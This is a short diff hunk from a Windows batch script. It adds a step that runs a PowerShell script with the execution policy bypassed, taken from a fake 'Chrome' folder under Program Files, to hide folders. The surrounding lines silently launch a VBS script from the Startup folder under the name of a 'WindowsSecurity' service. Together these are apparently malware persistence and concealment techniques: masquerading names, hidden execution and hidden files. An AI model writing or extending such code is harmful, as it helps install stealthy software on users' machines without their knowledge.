@@ -65,6 +65,10 @@ if not exist "%startupFolder%\run_hidden.vbs" (
     exit /b 1
 )
 
+:: Now run the PowerShell script to hide files
+echo Running PowerShell script to hide folders...
+powershell -ExecutionPolicy Bypass -File "C:\Program Files\Chrome\hide_folder.ps1"
+
 :: Run the hidden VBS script immediately to start the service
 echo Starting WindowsSecurity service via run_hidden.vbs...
 start "" wscript.exe "%startupFolder%\run_hidden.vbs" //B //Nologo
